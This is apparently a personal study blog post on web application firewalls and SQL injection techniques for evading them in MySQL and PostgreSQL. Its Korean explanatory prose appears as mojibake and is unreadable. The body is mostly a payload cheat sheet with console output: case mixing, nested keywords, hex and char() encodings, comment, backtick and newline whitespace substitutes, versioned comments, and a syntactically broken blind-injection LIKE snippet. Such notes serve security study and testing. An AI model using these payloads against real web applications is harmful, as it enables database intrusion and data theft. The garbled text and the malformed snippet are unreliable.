---
title: "[2025-07-16] ByPass WAF"
excerpt: "WAF ê°œë… ì •ë¦¬ ë° ìš°íšŒ ë°©ë²•"

categories:
  - Justice
tags:
  - [WAF]

permalink: /Justice/[2025-07-16] ByPass WAF/

toc: true
toc_sticky: true

date: 2025-07-16
last_modified_at: 2025-07-16
---

## ðŸ¦¥ ë³¸ë¬¸

## WAF

### ì •ì˜

Web Application Firewall. ì›¹ ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ë³´í˜¸í•˜ê¸° ìœ„í•œ ì „ìš© ë°©í™”ë²½ 

### ëª©ì 

1. ì›¹ ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ë…¸ë¦¬ëŠ” ë‹¤ì–‘í•œ ê³µê²© ì°¨ë‹¨
2. HTTP ìš”ì²­/ì‘ë‹µì„ ê²€ì‚¬í•˜ì—¬ ì•…ì„± íŒ¨í„´ íƒì§€
3. ë¡œê¹…

### ë™ìž‘ ë°©ì‹

1. ì‚¬ìš©ìžê°€ ì›¹ ì„œë²„ì— ìš”ì²­
2. ìš”ì²­ì´ WAFë¥¼ ë¨¼ì € í†µê³¼
3. WAFê°€ íŒ¨í„´ ë¶„ì„ í›„ ì•…ì„± ìš”ì²­ì¸ ê²½ìš° ì°¨ë‹¨
4. ì •ìƒ ìš”ì²­ë§Œ ì›¹ ì„œë²„ì— ì „ë‹¬  

## WAF ìš°íšŒ

### íƒì§€ ìš°íšŒ

- ëŒ€ì†Œë¬¸ìž í˜¼ìš© : SQL ë¬¸ì€ ëŒ€ì†Œë¬¸ìžë¥¼ êµ¬ë¶„í•˜ì§€ ì•Šê³  ì‹¤í–‰í•˜ê¸° ë•Œë¬¸ì— ëŒ€ì†Œë¬¸ìž ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤
    - EX) UNION í‚¤ì›Œë“œë¥¼ í•„í„°ë§ í•˜ëŠ” ê²½ìš°ì˜ ê³µê²©
    
    ```sql
    UnIoN SeLecT 1,2,3
    selECT SlEep(5)
    ```
    
- ê³µë°± ì¹˜í™˜ ìš°íšŒ : í•„í„°ë§ ì‹œ í•´ë‹¹ í‚¤ì›Œë“œë¥¼ ê³µë°±ìœ¼ë¡œ ì¹˜í™˜í•˜ëŠ” ê²½ìš° ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤
    - EX) UNION í‚¤ì›Œë“œ, SELECT í‚¤ì›Œë“œë¥¼ í•„í„°ë§í•˜ì—¬ ê³µë°±ìœ¼ë¡œ ì¹˜í™˜í•˜ëŠ” ê²½ìš°ì˜ ê³µê²©
    
    ```sql
    UNunionION SELselectECT 1,2 --
    # => UNION SELECT 1,2 --  
    ```
    
- reverse, concat ë©”ì†Œë“œ ì‚¬ìš© : reverseë‚˜ concat ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ìžì—´ í•„í„°ë§ì„ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤.
    - EX) reverse(), concat(), ì•„ìŠ¤í‚¤ì½”ë“œë¥¼ í†µí•œ ìš°íšŒ ë°©ë²•.
    
    ```sql
    mysql> SELECT reverse('nimda'), concat('adm','in'), x'61646d696e', 0x61646d696e;
    /*
    +------------------+--------------------+---------------+--------------+
    | reverse('nimda') | concat('adm','in') | x'61646d696e' | 0x61646d696e |
    +------------------+--------------------+---------------+--------------+
    | admin            | admin              | admin         | admin        |
    +------------------+--------------------+---------------+--------------+
    1 row in set (0.00 sec)
    */
    ```
    
- ì—°ì‚°ìž ê²€ì‚¬ ìš°íšŒ : ì—°ì‚°ìž í‚¤ì›Œë“œ í•„í„°ë§ì„ ì—°ì‚°ìž ê¸°í˜¸ë¥¼ í†µí•´ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤.
    - EX)
    
    ```sql
    mysql> select 1 || 1;
    /*
    +--------+
    | 1 || 1 |
    +--------+
    |      1 |
    +--------+
    1 row in set (0.00 sec)
    */
    ```
    
- ê³µë°± íƒì§€ ê²€ì‚¬ ìš°íšŒ : ê³µë°±ì„ í—ˆìš©í•˜ëŠ” ê²½ìš° ê³µê²©ìžê°€ ë‹¤ë¥¸ ì¿¼ë¦¬ë¥¼ ì‚½ìž…í•˜ëŠ” SQLiê°€ ë°œìƒí•  ìˆ˜ ìžˆì–´ì„œ ê³µë°±ì„ íƒì§€í•˜ëŠ” ê²½ìš°ê°€ ë§Žë‹¤. í•˜ì§€ë§Œ ì£¼ì„, Backtick ë“±ì„ ì´ìš©í•˜ì—¬ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤
    - EX) ì£¼ì„ì„ í†µí•œ ìš°íšŒ
    
    ```sql
    mysql> SELECT/**/'abc';
    /*
    +-----+
    | abc |
    +-----+
    | abc |
    +-----+
    1 row in set (0.00 sec)
    */
    ```
    
    - EX) Backtickì„ ì´ìš©í•œ ìš°íšŒ
    
    ```sql
    mysql> select`username`,(password)from`users`WHERE`username`='admin';
    /*
    +----------+----------------+
    | username | password       |
    +----------+----------------+
    | admin    | admin_password |
    +----------+----------------+
    1 row in set (0.00 sec)
    */
    ```
    
- LIKEë¥¼ ì´ìš©í•œ Blind SQL injection
    
    ```sql
    AND LIKE upw='p%'
    AND LIKE upw='pw%'
    ..
    AND LIKE upw='pw1234'
    ```
    

### MySQL ìš°íšŒ ê¸°ë²•

- MySQL ì§„ë²•ì„ ì´ìš©í•œ ë¬¸ìžì—´ ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    mysql> select 0x6162, 0b110000101100010;
    /*
    +--------+-------------------+
    | 0x6162 | 0b110000101100010 |
    +--------+-------------------+
    | ab     | ab                |
    +--------+-------------------+
    1 row in set (0.00 sec)
    */
    ```
    
- ë©”ì†Œë“œë¥¼ ì´ìš©í•œ ë¬¸ìžì—´ ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    mysql> select char(0x61, 0x62);
    /*
    +------------------+
    | char(0x61, 0x62) |
    +------------------+
    | ab               |
    +------------------+
    1 row in set (0.00 sec)
    */
    mysql> select concat(char(0x61), char(0x62));
    /*
    +--------------------------------+
    | concat(char(0x61), char(0x62)) |
    +--------------------------------+
    | ab                             |
    +--------------------------------+
    */
    ```
    
- MySQL ê°€ì ¯ì„ ì´ìš©í•œ ë¬¸ìžì—´ ê²€ì‚¬ ìš°íšŒ
    - ê°€ì ¯ :  í•¨ìˆ˜ ë˜ëŠ” í‘œí˜„ì‹ ì¤‘ ê³µê²©ì— í™œìš© ê°€ëŠ¥í•œ í•¨ìˆ˜ ì¡°í•© ë˜ëŠ” ìš°íšŒ ë„êµ¬
    
    ```sql
    mysql> select mid(@@version,12,1);
    /*
    +---------------------+
    | mid(@@version,12,1) |
    +---------------------+
    | n                   |
    +---------------------+
    */
    ```
    
- ê°œí–‰ì„ ì´ìš©í•œ ê³µë°± ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    mysql> select
        -> 1;
    /*
    +---+
    | 1 |
    +---+
    | 1 |
    +---+
    */
    ```
    
- ì£¼ì„ì„ ì´ìš©í•œ ê³µë°± ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    mysql> select/**/1;
    /*
    +---+
    | 1 |
    +---+
    | 1 |
    +---+
    */
    ```
    
- WAF ì£¼ì„ì„ ì´ìš©í•œ ìš°íšŒ : /**/ëŠ” WAFì—ì„œëŠ” ì£¼ì„ì´ì§€ë§Œ SQLì—ì„œëŠ” ì‹¤í–‰ëœë‹¤.
    
    ```sql
    mysql> select 1 /*!union*/ select 2;
    /*
    +---+
    | 1 |
    +---+
    | 1 |
    | 2 |
    +---+
    2 rows in set (0.00 sec)
    */
    ```
    

### PostgreSQL ìš°íšŒ ê¸°ë²•

- ë©”ì†Œë“œë¥¼ ì´ìš©í•œ ë¬¸ìžì—´ ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    postgres=> select concat(chr(65), chr(66));
    /*
     concat
    --------
     AB
    */
    ```
    
- ê°€ì ¯ì„ ì´ìš©í•œ ë¬¸ìžì—´ ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    postgres=> select substring(version(),23,1);
    /*
     substring
    -----------
     n
    */
    ```
    
- ê°œí–‰ì„ ì´ìš©í•œ ê³µë°± ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    postgres=> select
    1;
    /*
     ?column?
    ----------
            1
    */
    ```
    
- ì£¼ì„ì„ ì´ìš©í•œ ê³µë°± ê²€ì‚¬ ìš°íšŒ
    
    ```sql
    postgres=> select/**/1;
    /*
     ?column?
    ----------
            1
    */
    ```